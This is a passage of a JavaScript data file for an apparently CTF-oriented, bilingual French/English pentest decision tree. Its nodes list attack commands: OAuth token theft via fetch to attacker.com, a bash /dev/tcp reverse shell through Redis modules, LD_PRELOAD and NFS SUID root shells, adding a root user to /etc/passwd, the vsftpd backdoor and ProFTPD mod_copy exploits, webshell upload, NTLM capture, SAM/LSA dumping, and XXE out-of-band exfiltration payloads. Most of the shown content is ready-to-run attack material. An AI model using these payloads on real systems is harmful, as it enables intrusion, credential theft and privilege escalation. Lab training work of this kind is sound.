      { label: "Bypass de sanitisation", label_en: "Sanitization bypass", cmd: "# Tester différentes variantes :\n{\"__proto__\":{\"isAdmin\":\"true\"}}\n{\"constructor\":{\"prototype\":{\"role\":\"admin\"}}}" }
    ],
    lookfor: ["Application Node.js (Express, etc.)", "Paramètres JSON directement fusionnés avec des objets", "Fonctions merge/extend/assign non sécurisées"],
    lookfor_en: ["Node.js application (Express, etc.)", "JSON parameters directly merged with objects", "Unsafe merge/extend/assign functions"],
    tips: [
      "Affecter __proto__.admin peut permettre de bypasser des checks comme if(user.admin)",
      "PPmap (tool) automatise la détection",
      "Combiner avec SSTI si l'app utilise un moteur de templates"
    ],
    tips_en: [
      "Setting __proto__.admin can bypass checks like if(user.admin)",
      "PPmap (tool) automates detection",
      "Combine with SSTI if the app uses a template engine"
    ],
    choices: [
      { label: "Bypass auth → accès admin", label_en: "Auth bypass → admin access", next: "web_authenticated", icon: "✅" },
      { label: "RCE obtenu via pollution + template", label_en: "RCE obtained via pollution + template engine", next: "rce_found", icon: "💥" }
    ]
  },

  "web_oauth_attack": {
    id: "web_oauth_attack", title: "OAuth / SSO — Attaques", title_en: "OAuth / SSO — Attacks", category: "web", icon: "🔑",
    description: "Mauvaises implémentations OAuth permettent de voler des tokens d'accès, de bypasser l'authentification ou d'accéder à des comptes tiers.",
    description_en: "Poor OAuth implementations allow stealing access tokens, bypassing authentication, or accessing third-party accounts.",
    commands: [
      { label: "Open Redirect + OAuth = vol de token", label_en: "Open Redirect + OAuth = token theft", cmd: "# Si redirect_uri n'est pas validée :\nhttps://TARGET/oauth/authorize?response_type=token&redirect_uri=https://attacker.com/callback\n# Le token arrivera sur votre serveur dans le hash de l'URL" },
      { label: "State parameter manquant → CSRF", label_en: "Missing state parameter → CSRF", cmd: "# Capturer le flow OAuth\n# Supprimer le paramètre state\n# Remplacer le code d'autorisation par le vôtre" },
      { label: "Implicit flow — token dans URL", label_en: "Implicit flow — token in URL", cmd: "# Si access_token est dans le fragment #\n# Créer une page qui le lit :\n<script>fetch('http://attacker.com/?t='+location.hash)</script>" },
      { label: "JWT none algorithm", label_en: "JWT none algorithm", cmd: "# Si token OAuth est un JWT :\n# Décoder, modifier le payload (admin:true), mettre alg:none, supprimer la signature\njwt_tool TOKEN -X a" }
    ],
    lookfor: ["redirect_uri non validée", "Absence du paramètre state", "Token dans les logs ou Referer header", "JWT avec algorithme modifiable"],
    lookfor_en: ["Unvalidated redirect_uri", "Missing state parameter", "Token in logs or Referer header", "JWT with modifiable algorithm"],
    tips: [
      "PortSwigger OAuth labs = meilleure pratique",
      "Les tokens OAuth dans l'historique navigateur / Referer header",
      "Account linking : souvent exploitable pour merger des comptes"
    ],
    tips_en: [
      "PortSwigger OAuth labs = best practice resource",
      "OAuth tokens in browser history / Referer header",
      "Account linking: often exploitable to merge accounts"
    ],
    choices: [
      { label: "Token volé → accès compte", label_en: "Token stolen → account access", next: "web_authenticated", icon: "✅" }
    ]
  },

  // ── PIVOTING ──────────────────────────────────────────────────────────────────
  "pivoting": {
    id: "pivoting", title: "Pivoting & Tunneling", title_en: "Pivoting & Tunneling", category: "exploit", icon: "🔀",
    description: "Accéder à des réseaux internes inaccessibles directement via une machine compromise comme relais. Technique fondamentale pour les environnements multi-réseaux.",
    description_en: "Access internal networks not directly reachable by using a compromised machine as a relay. Fundamental technique for multi-network environments.",
    commands: [
      { label: "Chisel — tunnel SOCKS5 (le plus simple)", label_en: "Chisel — SOCKS5 tunnel (simplest)", cmd: "# Sur votre machine (serveur) :\nchisel server -p 8080 --reverse\n# Sur la cible (client) :\n./chisel client YOUR_IP:8080 R:socks\n# Configurer proxychains.conf :\nsocks5 127.0.0.1 1080\n# Utiliser :\nproxychains nmap -sT -Pn TARGET_INTERNAL_IP" },
      { label: "SSH Dynamic Port Forwarding", label_en: "SSH Dynamic Port Forwarding", cmd: "# Depuis votre machine :\nssh -D 1080 -N -f user@COMPROMISED_HOST\n# Configurer proxychains :\nproxychains firefox\nproxychains nmap -sT -Pn INTERNAL_IP" },
      { label: "SSH Local Port Forwarding", label_en: "SSH Local Port Forwarding", cmd: "# Accéder au port 3306 interne via localhost:3307 :\nssh -L 3307:INTERNAL_HOST:3306 user@COMPROMISED_HOST\n# Puis : mysql -h 127.0.0.1 -P 3307 -u root" },
      { label: "SSH Remote Port Forwarding", label_en: "SSH Remote Port Forwarding", cmd: "# Depuis la cible, exposer un service interne :\nssh -R 8888:INTERNAL_HOST:80 user@YOUR_IP\n# Votre machine accède à INTERNAL via localhost:8888" },
      { label: "Ligolo-ng — le plus performant", label_en: "Ligolo-ng — best performance", cmd: "# Sur votre machine :\n./proxy -selfcert -laddr 0.0.0.0:11601\n# Sur la cible :\n./agent -connect YOUR_IP:11601 -ignore-cert\n# Dans ligolo-ng :\nsession → 1 → start\n# Ajouter route :\nsudo ip route add 10.10.10.0/24 dev ligolo" },
      { label: "Socat — port forwarding simple", label_en: "Socat — simple port forwarding", cmd: "# Relier port local → service interne :\nsocat TCP-LISTEN:1234,fork TCP:INTERNAL_IP:80" }
    ],
    lookfor: [
      "Interfaces réseau multiples sur la machine compromise (ip a / ifconfig)",
      "Routes vers d'autres réseaux (ip route)",
      "Services visibles depuis la machine mais pas depuis l'extérieur (netstat -tlnp)"
    ],
    lookfor_en: [
      "Multiple network interfaces on the compromised machine (ip a / ifconfig)",
      "Routes to other networks (ip route)",
      "Services visible from the machine but not from outside (netstat -tlnp)"
    ],
    tips: [
      "Toujours faire 'ip a' et 'ip route' sur chaque machine compromise — double pivot courant",
      "Chisel est le plus simple : un binaire, pas de dépendances SSH",
      "Ligolo-ng = meilleure expérience (pas de proxychains nécessaire, route système)"
    ],
    tips_en: [
      "Always run 'ip a' and 'ip route' on every compromised machine — double pivot is common",
      "Chisel is the simplest: one binary, no SSH dependencies",
      "Ligolo-ng = best experience (no proxychains needed, system-level routing)"
    ],
    choices: [
      { label: "Réseau interne accessible → nouveau scan", label_en: "Internal network accessible → new scan", next: "start", icon: "🎯" },
      { label: "Service AD interne découvert", label_en: "Internal AD service discovered", next: "ad_initial", icon: "🏰" }
    ]
  },

  // ── PRIVESC LINUX AVANCÉS ─────────────────────────────────────────────────────
  "privesc_linux_shared_lib": {
    id: "privesc_linux_shared_lib", title: "PrivEsc Linux — Shared Library Hijacking", title_en: "Linux PrivEsc — Shared Library Hijacking", category: "privesc", icon: "📚",
    description: "Si un binaire SUID ou appelé par root charge une bibliothèque depuis un chemin modifiable (LD_LIBRARY_PATH, rpath, /etc/ld.so.conf), on peut substituer une lib malveillante.",
    description_en: "If a SUID binary or one called by root loads a library from a writable path (LD_LIBRARY_PATH, rpath, /etc/ld.so.conf), a malicious library can be substituted.",
    commands: [
      { label: "Trouver les bibliothèques chargées", label_en: "Find loaded libraries", cmd: "ldd /path/to/suid_binary\nreadelf -d /path/to/suid_binary | grep RPATH\nreadelf -d /path/to/suid_binary | grep NEEDED" },
      { label: "Vérifier les chemins modifiables", label_en: "Check writable paths", cmd: "# Si un chemin de lib est writable :\nls -la /chemin/vers/lib/\n# ou si LD_LIBRARY_PATH pointe vers répertoire writable" },
      { label: "LD_PRELOAD (si conservé dans sudo)", label_en: "LD_PRELOAD (if preserved in sudo)", cmd: "# Si sudo -l montre env_keep+=LD_PRELOAD :\ncat > /tmp/evil.c << 'EOF'\n#include <stdlib.h>\nvoid _init() { setuid(0); system(\"/bin/bash -p\"); }\nEOF\ngcc -shared -fPIC -nostartfiles /tmp/evil.c -o /tmp/evil.so\nsudo LD_PRELOAD=/tmp/evil.so VULNERABLE_COMMAND" },
      { label: "Créer la fausse bibliothèque", label_en: "Create the fake library", cmd: "cat > evil.c << 'EOF'\n#include <stdlib.h>\n#include <stdio.h>\nvoid lib_function() __attribute__((constructor));\nvoid lib_function() { system(\"/bin/bash -p\"); }\nEOF\ngcc -shared -fPIC evil.c -o libevil.so\ncp libevil.so /chemin/writable/libNOM.so" }
    ],
    lookfor: [
      "RPATH/RUNPATH dans un binaire SUID pointant vers un dossier writable",
      "sudo env_keep+=LD_PRELOAD dans sudo -l",
      "Bibliothèques dans /tmp ou /home (writable) dans le chemin de résolution"
    ],
    lookfor_en: [
      "RPATH/RUNPATH in a SUID binary pointing to a writable directory",
      "sudo env_keep+=LD_PRELOAD in sudo -l",
      "Libraries in /tmp or /home (writable) in the resolution path"
    ],
    tips: [
      "ldd sur un SUID montre les bibliothèques chargées avec leurs chemins",
      "LD_PRELOAD + sudo = vecteur classique mais souvent patché dans sudo moderne",
      "Même technique avec les scripts Python si PYTHONPATH modifiable"
    ],
    tips_en: [
      "ldd on a SUID binary shows loaded libraries with their paths",
      "LD_PRELOAD + sudo = classic vector but often patched in modern sudo",
      "Same technique with Python scripts if PYTHONPATH is writable"
    ],
    choices: [
      { label: "Root obtenu via lib hijacking !", label_en: "Root obtained via library hijacking!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_nfs": {
    id: "privesc_linux_nfs", title: "PrivEsc Linux — NFS no_root_squash", title_en: "Linux PrivEsc — NFS no_root_squash", category: "privesc", icon: "📂",
    description: "Si /etc/exports contient no_root_squash sur un export accessible, on peut créer des binaires SUID depuis notre machine et les exécuter sur la cible.",
    description_en: "If /etc/exports has no_root_squash on an accessible export, SUID binaries can be created from your machine and executed on the target.",
    commands: [
      { label: "Vérifier /etc/exports sur la cible", label_en: "Check /etc/exports on the target", cmd: "cat /etc/exports\n# Chercher no_root_squash" },
      { label: "Vérifier depuis l'extérieur", label_en: "Check from outside", cmd: "showmount -e TARGET_IP" },
      { label: "Monter et exploiter", label_en: "Mount and exploit", cmd: "# Sur votre machine LOCALE (en root) :\nsudo mount -t nfs TARGET_IP:/shared /mnt/nfs -o nolock\nsudo cp /bin/bash /mnt/nfs/\nsudo chmod +s /mnt/nfs/bash\n# Sur la cible :\n/shared/bash -p" },
      { label: "Variante avec exécutable custom", label_en: "Variant with custom executable", cmd: "# Sur votre machine locale (root) :\ncat > /tmp/shell.c << 'EOF'\nint main(){setuid(0);setgid(0);system(\"/bin/bash\");}\nEOF\ngcc /tmp/shell.c -o /mnt/nfs/shell\nchmod u+s /mnt/nfs/shell\n# Sur la cible : /shared/shell" }
    ],
    lookfor: ["no_root_squash dans /etc/exports", "Export monté accessible depuis votre IP"],
    lookfor_en: ["no_root_squash in /etc/exports", "Mounted export accessible from your IP"],
    tips: ["root_squash est la valeur par défaut sécurisée", "no_root_squash = conception de l'export intentionnellement vulnérable en CTF"],
    tips_en: ["root_squash is the secure default value", "no_root_squash = intentionally vulnerable export design in CTF"],
    choices: [
      { label: "Root obtenu via NFS SUID !", label_en: "Root obtained via NFS SUID!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_writable_passwd": {
    id: "privesc_linux_writable_passwd", title: "PrivEsc Linux — /etc/passwd Modifiable", title_en: "Linux PrivEsc — Writable /etc/passwd", category: "privesc", icon: "📝",
    description: "Si /etc/passwd est en écriture, on peut ajouter un utilisateur root directement ou modifier le mot de passe de root.",
    description_en: "If /etc/passwd is writable, a root user can be added directly or root's password can be modified.",
    commands: [
      { label: "Vérifier les permissions", label_en: "Check permissions", cmd: "ls -la /etc/passwd /etc/shadow" },
      { label: "Ajouter un utilisateur root", label_en: "Add a root user", cmd: "# Générer un hash :\necho 'newroot' | openssl passwd -1 -stdin\n# Ajouter la ligne :\necho 'newroot:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu - newroot" },
      { label: "Modifier root directement (si password champ vide possible)", label_en: "Modify root directly (empty password field)", cmd: "# Copier /etc/passwd, modifier 'x' de root → rien (pas de mot de passe)\nsed 's/root:x:/root::/' /etc/passwd > /tmp/passwd && cp /tmp/passwd /etc/passwd\nsu root  # mot de passe vide" }
    ],
    lookfor: ["/etc/passwd world-writable (chmod 666 ou 777)", "Groupe avec droits d'écriture sur /etc/passwd"],
    lookfor_en: ["/etc/passwd world-writable (chmod 666 or 777)", "Group with write access to /etc/passwd"],
    tips: ["Dans /etc/passwd, le 'x' signifie que le hash est dans /etc/shadow. Le supprimer = pas de mot de passe"],
    tips_en: ["In /etc/passwd, 'x' means the hash is in /etc/shadow. Removing it = no password required"],
    choices: [
      { label: "Root obtenu !", label_en: "Root obtained!", next: "root_obtained", icon: "👑" }
    ]
  },

  // ── FTP AVANCÉ (depuis Fawn) ──────────────────────────────────────────────────
  "ftp_deep": {
    id: "ftp_deep", title: "FTP — Exploitation Avancée", title_en: "FTP — Advanced Exploitation", category: "network", icon: "📂",
    description: "Au-delà du login anonyme : ProFTPD mod_copy, FTP bounce, upload de webshell, CVEs de services FTP.",
    description_en: "Beyond anonymous login: ProFTPD mod_copy, FTP bounce, webshell upload, FTP service CVEs.",
    commands: [
      { label: "ProFTPD 1.3.5 — mod_copy RCE (CVE-2015-3306)", label_en: "ProFTPD 1.3.5 — mod_copy RCE (CVE-2015-3306)", cmd: "# Site CPFR/CPTO copient des fichiers sans auth :\nnc -nv TARGET_IP 21\nSITE CPFR /etc/passwd\nSITE CPTO /var/www/html/passwd.txt\n# Copier un webshell déjà présent :\nSITE CPFR /proc/self/cmdline\nSITE CPTO /var/www/html/shell.php" },
      { label: "FTP Bounce — scanner réseaux internes", label_en: "FTP Bounce — scan internal networks", cmd: "# Utiliser le FTP server pour scanner d'autres IPs\nnmap -P0 -b anonymous@TARGET_IP INTERNAL_NETWORK/24" },
      { label: "Upload de webshell si droits d'écriture dans webroot", label_en: "Upload webshell if write access to webroot", cmd: "ftp TARGET_IP\nftp> binary\nftp> put shell.php\nftp> bye\n# Puis accéder via http://TARGET/shell.php" },
      { label: "vsftpd 2.3.4 — backdoor", label_en: "vsftpd 2.3.4 — backdoor", cmd: "# Envoyer ':)' dans le username pour déclencher la backdoor\necho -e 'USER backdoor:)\\nPASS anything' | nc -w 3 TARGET_IP 21 &\nnc TARGET_IP 6200  # Port backdoor" }
    ],
    lookfor: [
      "ProFTPD 1.3.5 → mod_copy disponible",
      "Droits d'écriture dans le webroot FTP → upload direct de webshell",
      "vsftpd 2.3.4 → backdoor bien connue"
    ],
    lookfor_en: [
      "ProFTPD 1.3.5 → mod_copy available",
      "Write access in FTP webroot → direct webshell upload",
      "vsftpd 2.3.4 → well-known backdoor"
    ],
    tips: [
      "Toujours vérifier la version exacte du daemon FTP → searchsploit",
      "Si FTP + Apache sur le même serveur : upload FTP dans /var/www/html = webshell direct"
    ],
    tips_en: [
      "Always check the exact FTP daemon version → searchsploit",
      "If FTP + Apache on the same server: upload via FTP to /var/www/html = direct webshell"
    ],
    choices: [
      { label: "RCE via ProFTPD mod_copy ou vsftpd backdoor", label_en: "RCE via ProFTPD mod_copy or vsftpd backdoor", next: "rce_found", icon: "💥" },
      { label: "Webshell uploadé → RCE", label_en: "Webshell uploaded → RCE", next: "rce_found", icon: "💥" }
    ]
  },

  // ── SMB AVANCÉ (depuis Dancing) ──────────────────────────────────────────────
  "smb_deep": {
    id: "smb_deep", title: "SMB — Techniques Avancées", title_en: "SMB — Advanced Techniques", category: "network", icon: "🪟",
    description: "Au-delà de l'énumération basique : SCF files, PetitPotam, PrintNightmare via SMB, NetExec modules.",
    description_en: "Beyond basic enumeration: SCF files, PetitPotam, PrintNightmare via SMB, NetExec modules.",
    commands: [
      { label: "SCF File Attack — capturer NTLM depuis partage", label_en: "SCF File Attack — capture NTLM from share", cmd: "# Créer @evil.scf dans un partage SMB accessible en écriture :\n[Shell]\nCommand=2\nIconFile=\\\\YOUR_IP\\share\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n# Quand quelqu'un ouvre le dossier → authentification NTLM capturée par Responder" },
      { label: "PetitPotam — coercer authentification DC", label_en: "PetitPotam — coerce DC authentication", cmd: "# Forcer le DC à s'authentifier vers vous :\npython3 PetitPotam.py -u USER -p PASS YOUR_IP DC_IP\n# Combiner avec ntlmrelayx → DCSync ou ADCS attack" },
      { label: "Lister les sessions actives (si droits)", label_en: "List active sessions (if authorized)", cmd: "crackmapexec smb TARGET_IP -u USER -p PASS --sessions\ncrackmapexec smb TARGET_IP -u USER -p PASS --loggedon-users" },
      { label: "Dumper les credentials locaux", label_en: "Dump local credentials", cmd: "crackmapexec smb TARGET_IP -u USER -p PASS --sam\ncrackmapexec smb TARGET_IP -u USER -p PASS --lsa" },
      { label: "Chercher des fichiers sensibles sur tous les partages", label_en: "Search for sensitive files across all shares", cmd: "crackmapexec smb TARGET_IP -u USER -p PASS -M spider_plus -o DOWNLOAD_FLAG=True\nnetexec smb TARGET_IP -u USER -p PASS -M spider_plus" }
    ],
    lookfor: ["Partages en écriture → SCF/LNK attack", "DC accessible → PetitPotam + relay"],
    lookfor_en: ["Writable shares → SCF/LNK attack", "DC accessible → PetitPotam + relay"],
    tips: [
      "spider_plus de CrackMapExec crawle tous les partages et télécharge les fichiers intéressants",
      "PetitPotam + ntlmrelayx vers ADCS = Golden Certificate si PKI disponible"
    ],
    tips_en: [
      "CrackMapExec spider_plus crawls all shares and downloads interesting files",
      "PetitPotam + ntlmrelayx toward ADCS = Golden Certificate if PKI is available"
    ],
    choices: [
      { label: "Hash NTLM capturé → relay ou crack", label_en: "NTLM hash captured → relay or crack", next: "smb_ntlm_capture", icon: "🎣" },
      { label: "SAM/LSA dumpé → credentials locaux", label_en: "SAM/LSA dumped → local credentials", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ── REDIS AVANCÉ (Redeemer — compléter ce qui manquait) ─────────────────────
  "redis_rce_module": {
    id: "redis_rce_module", title: "Redis — RCE via Module Malveillant", title_en: "Redis — RCE via Malicious Module", category: "exploit", icon: "🔴",
    description: "Redis 4.x/5.x sans auth : charger un module .so malveillant pour exécuter des commandes OS. Plus fiable que cron/SSH dans certains contextes.",
    description_en: "Redis 4.x/5.x without auth: load a malicious .so module to execute OS commands. More reliable than cron/SSH in some contexts.",
    commands: [
      { label: "Vérifier la version Redis et les droits", label_en: "Check Redis version and permissions", cmd: "redis-cli -h TARGET_IP\n> info server\n> config get dir\n> config get dbfilename" },
      { label: "Compiler le module RedisModules-ExecuteCommand", label_en: "Compile the RedisModules-ExecuteCommand module", cmd: "# Cloner et compiler :\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\ncd RedisModules-ExecuteCommand && make\n# Output : module.so" },
      { label: "Uploader et charger le module", label_en: "Upload and load the module", cmd: "# Via redis-cli :\nredis-cli -h TARGET_IP config set dir /tmp\n# Transférer module.so sur la cible d'abord\n# Puis :\nredis-cli -h TARGET_IP module load /tmp/module.so\nredis-cli -h TARGET_IP command do system.exec id" },
      { label: "Méthode maître-esclave RCE (Redis 4/5)", label_en: "Master-slave RCE method (Redis 4/5)", cmd: "# Utiliser redis-rogue-server :\ngit clone https://github.com/n0b0dyCN/redis-rogue-server\npython3 redis-rogue-server.py --rhost TARGET_IP --lhost YOUR_IP" },
      { label: "Reverse shell via module", label_en: "Reverse shell via module", cmd: "redis-cli -h TARGET_IP command do system.exec 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'" }
    ],
    lookfor: ["Redis sans authentification", "Version Redis 4.x ou 5.x (module loading)", "Droits d'écriture sur un répertoire"],
    lookfor_en: ["Redis without authentication", "Redis version 4.x or 5.x (module loading)", "Write access to a directory"],
    tips: [
      "redis-rogue-server automatise tout le processus maître/esclave RCE",
      "Si Redis tourne en root (courant sur des VMs CTF) → root direct"
    ],
    tips_en: [
      "redis-rogue-server automates the entire master/slave RCE process",
      "If Redis runs as root (common on CTF VMs) → direct root access"
    ],
    choices: [
      { label: "RCE obtenu via module Redis", label_en: "RCE obtained via Redis module", next: "rce_found", icon: "💥" }
    ]
  },

  // ── PORT KNOCKING ─────────────────────────────────────────────────────────────
  "port_knocking": {
    id: "port_knocking", title: "Port Knocking", title_en: "Port Knocking", category: "network", icon: "🚪",
    description: "Service caché derrière une séquence de paquets à envoyer sur des ports spécifiques pour ouvrir dynamiquement le vrai port (SSH, etc.).",
    description_en: "Service hidden behind a sequence of packets to send on specific ports to dynamically open the real port (SSH, etc.).",
    commands: [
      { label: "Lire la config de port knocking", label_en: "Read port knocking config", cmd: "# Chercher dans :\ncat /etc/knockd.conf\n# Ou dans les fichiers de config trouvés sur la machine" },
      { label: "Effectuer la séquence de knock", label_en: "Perform the knock sequence", cmd: "# Avec knock :\nknock TARGET_IP 7000 8000 9000\n# Avec nmap :\nnmap -Pn --host-timeout 100 --max-retries 0 -p 7000 TARGET_IP\nnmap -Pn --host-timeout 100 --max-retries 0 -p 8000 TARGET_IP\nnmap -Pn --host-timeout 100 --max-retries 0 -p 9000 TARGET_IP\n# Avec netcat (rapidement) :\nfor port in 7000 8000 9000; do nc -z -w1 TARGET_IP $port; done" },
      { label: "Après knock — se connecter au port ouvert", label_en: "After knock — connect to the opened port", cmd: "# Typiquement SSH s'ouvre après le knock :\nssh user@TARGET_IP" },
      { label: "Scanner après knock pour voir les nouveaux ports", label_en: "Scan after knock to see new ports", cmd: "nmap -sV TARGET_IP" }
    ],
    lookfor: ["/etc/knockd.conf sur la cible (si accès fichiers)", "Service fermé dans le premier scan mais mentionné dans les indices du CTF"],
    lookfor_en: ["/etc/knockd.conf on the target (if file access available)", "Service closed in the first scan but mentioned in CTF hints"],
    tips: [
      "knockd.conf contient la séquence exacte et le port qui s'ouvre",
      "La séquence peut être en TCP, UDP ou une combinaison",
      "Certains CTF indiquent la séquence dans un fichier texte accessible via FTP/HTTP"
    ],
    tips_en: [
      "knockd.conf contains the exact sequence and the port that opens",
      "The sequence can be TCP, UDP, or a combination",
      "Some CTFs indicate the sequence in a text file accessible via FTP/HTTP"
    ],
    choices: [
      { label: "Port SSH/autre ouvert après knock", label_en: "SSH/other port opened after knock", next: "ssh_enum", icon: "🔐" }
    ]
  }

}); // fin Object.assign

// ─── Patch des nœuds existants ────────────────────────────────────────────────

// start → ajouter les nouveaux services
NODES["start"].choices.push(
  { label: "Port 23 ouvert (Telnet)", label_en: "Port 23 open (Telnet)", next: "telnet_enum", icon: "📟" },
  { label: "Port 161 UDP ouvert (SNMP)", label_en: "Port 161 UDP open (SNMP)", next: "snmp_enum", icon: "📡" },
  { label: "Port 25/587 ouvert (SMTP)", label_en: "Port 25/587 open (SMTP)", next: "smtp_enum", icon: "📧" },
  { label: "Port 389/636 ouvert (LDAP / Active Directory)", label_en: "Port 389/636 open (LDAP / Active Directory)", next: "ldap_enum", icon: "🗂️" },
  { label: "Port 5985/5986 ouvert (WinRM)", label_en: "Port 5985/5986 open (WinRM)", next: "winrm_enum", icon: "🖵" },
  { label: "Port 1433 ouvert (MSSQL)", label_en: "Port 1433 open (MSSQL)", next: "mssql_enum", icon: "🗄️" },
  { label: "Port 2049 ouvert (NFS)", label_en: "Port 2049 open (NFS)", next: "nfs_enum", icon: "📂" },
  { label: "Port 5432 ouvert (PostgreSQL)", label_en: "Port 5432 open (PostgreSQL)", next: "postgresql_enum", icon: "🐘" },
  { label: "Port 8080/8443 (Jenkins / App Java)", label_en: "Port 8080/8443 (Jenkins / Java App)", next: "jenkins_rce", icon: "🔧" },
  { label: "Port 2375/2376 ouvert (Docker API)", label_en: "Port 2375/2376 open (Docker API)", next: "docker_api_exposed", icon: "🐳" },
  { label: "Environnement Active Directory détecté (port 88)", label_en: "Active Directory environment detected (port 88)", next: "ad_initial", icon: "🏰" }
);

// smb_authenticated → ajouter chemin vers AD et pivoting
NODES["smb_authenticated"].choices.push(
  { label: "Environnement AD → aller plus loin", label_en: "AD environment → go further", next: "bloodhound", icon: "🐕" }
);

// credentials_found → ajouter password spray et AD
NODES["credentials_found"].choices.push(
  { label: "AD en cible → BloodHound", label_en: "AD target → BloodHound", next: "bloodhound", icon: "🐕" },
  { label: "Réseau interne découvert → pivoting", label_en: "Internal network discovered → pivoting", next: "pivoting", icon: "🔀" }
);

// privesc_linux_enum → ajouter les nouveaux vecteurs
NODES["privesc_linux_enum"].choices.push(
  { label: "NFS avec no_root_squash détecté", label_en: "NFS with no_root_squash detected", next: "privesc_linux_nfs", icon: "📂" },
  { label: "/etc/passwd modifiable", label_en: "/etc/passwd is writable", next: "privesc_linux_writable_passwd", icon: "📝" },
  { label: "Bibliothèque chargée depuis chemin modifiable", label_en: "Library loaded from writable path", next: "privesc_linux_shared_lib", icon: "📚" }
);

// shell_stabilize → ajouter chemin vers pivoting
NODES["shell_stabilize"].choices.push(
  { label: "Interfaces réseau multiples → pivoting", label_en: "Multiple network interfaces → pivoting", next: "pivoting", icon: "🔀" }
);

// web_initial → ajouter désérialisation et GraphQL
NODES["web_initial"].choices.push(
  { label: "Données sérialisées dans les cookies/requêtes (rO0, AC ED...)", label_en: "Serialized data in cookies/requests (rO0, AC ED...)", next: "web_deserialization", icon: "🔄" },
  { label: "Endpoint GraphQL trouvé (/graphql, /api/graphql)", label_en: "GraphQL endpoint found (/graphql, /api/graphql)", next: "web_graphql", icon: "⬡" }
);

// redis_enum → ajouter RCE module
NODES["redis_enum"].choices.push(
  { label: "Redis 4/5 sans auth → RCE via module", label_en: "Redis 4/5 without auth → RCE via module", next: "redis_rce_module", icon: "💥" }
);

// ftp_enum → ajouter exploitation avancée
NODES["ftp_enum"].choices.push(
  { label: "ProFTPD 1.3.5 ou vsftpd version suspecte → aller plus loin", label_en: "ProFTPD 1.3.5 or suspicious vsftpd version → go further", next: "ftp_deep", icon: "🎯" }
);

// smb_enum → ajouter techniques avancées et AD
NODES["smb_enum"].choices.push(
  { label: "Environnement AD → énumération AD", label_en: "AD environment → AD enumeration", next: "ad_initial", icon: "🏰" },
  { label: "Partage en écriture → SCF/techniques avancées", label_en: "Writable share → SCF/advanced techniques", next: "smb_deep", icon: "⚔️" }
);

// ── New nodes (v2 update) ─────────────────────────────────────────────────────

Object.assign(NODES, {

  "web_xxe": {
    id: "web_xxe", title: "XXE — XML External Entity", title_en: "XXE — XML External Entity", category: "web", icon: "📄",
    description: "L'application analyse du XML contrôlé par l'attaquant et les entités XML externes ne sont pas désactivées → lecture de fichiers locaux, SSRF, ou RCE.",
    description_en: "The application parses attacker-controlled XML and external XML entities are not disabled → local file read, SSRF, or RCE.",
    commands: [
      { label: "Payload XXE — lecture de fichier", label_en: "XXE payload — file read", cmd: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>' },
      { label: "XXE — lecture /etc/shadow via wrapper PHP", label_en: "XXE — read /etc/shadow via PHP wrapper", cmd: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">\n]>\n<root>&xxe;</root>' },
      { label: "XXE — SSRF vers service interne", label_en: "XXE — SSRF to internal service", cmd: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<root>&xxe;</root>' },
      { label: "XXE — Blind via out-of-band (OOB)", label_en: "XXE — Blind via out-of-band (OOB)", cmd: '# Héberger un DTD malveillant sur ton serveur :\n# evil.dtd :\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % oob "<!ENTITY exfil SYSTEM \'http://YOUR_IP/?data=%file;\' >">\n%oob;\n\n# Payload XXE :\n<?xml version="1.0"?>\n<!DOCTYPE foo SYSTEM "http://YOUR_IP/evil.dtd">\n<root>&exfil;</root>' },
      { label: "Détecter XXE dans Content-Type", label_en: "Detect XXE in Content-Type", cmd: "# Changer Content-Type: application/json → application/xml\n# ou Content-Type: text/xml\n# et envoyer un payload XML minimaliste" }
    ],
    lookfor: [
      "L'app accepte du XML (API, upload de fichier, SOAP, PDF/DOCX parseur)",
      "Content-Type: application/xml ou text/xml",
      "Réponse d'erreur qui reflète le contenu XML",
      "Endpoints /api/upload, /import, /convert"
    ],
    lookfor_en: [
      "App accepts XML (API, file upload, SOAP, PDF/DOCX parser)",
      "Content-Type: application/xml or text/xml",
      "Error response that reflects XML content",
      "Endpoints /api/upload, /import, /convert"
    ],
    tips: [
      "Burp Suite → intercepter et modifier Content-Type pour injecter du XML",
      "XXE Blind → utiliser Burp Collaborator ou interactsh pour détecter les callbacks OOB",
      "Certains parseurs bloquent les entités externes mais pas les parameter entities",
      "DOCX/XLSX/ODT sont des ZIPs contenant du XML → potentiellement vulnérables"
    ],
    tips_en: [
      "Burp Suite → intercept and modify Content-Type to inject XML",
      "Blind XXE → use Burp Collaborator or interactsh to detect OOB callbacks",
      "Some parsers block external entities but not parameter entities",
      "DOCX/XLSX/ODT are ZIPs containing XML → potentially vulnerable"
    ],
    choices: [
      { label: "Lecture de fichiers locaux obtenue", label_en: "Local file read obtained", next: "web_lfi_found", icon: "📂" },
      { label: "SSRF vers service interne confirmé", label_en: "SSRF to internal service confirmed", next: "rce_found", icon: "💥" }
    ]
  },

  "web_cors": {
    id: "web_cors", title: "CORS Misconfiguration", title_en: "CORS Misconfiguration", category: "web", icon: "🌐",
    description: "Le serveur reflète n'importe quelle origine ou fait confiance à null/sous-domaines non contrôlés → vol de données authentifiées cross-origin.",
    description_en: "The server reflects any origin or trusts null/uncontrolled subdomains → theft of authenticated cross-origin data.",
    commands: [
      { label: "Tester la réflexion d'origine", label_en: "Test origin reflection", cmd: "curl -s -H 'Origin: https://evil.com' -I http://TARGET_IP/api/user\n# Chercher: Access-Control-Allow-Origin: https://evil.com\n# et: Access-Control-Allow-Credentials: true" },
      { label: "Tester null origin", label_en: "Test null origin", cmd: "curl -s -H 'Origin: null' -I http://TARGET_IP/api/user\n# Si: Access-Control-Allow-Origin: null → vulnérable via sandboxed iframe" },
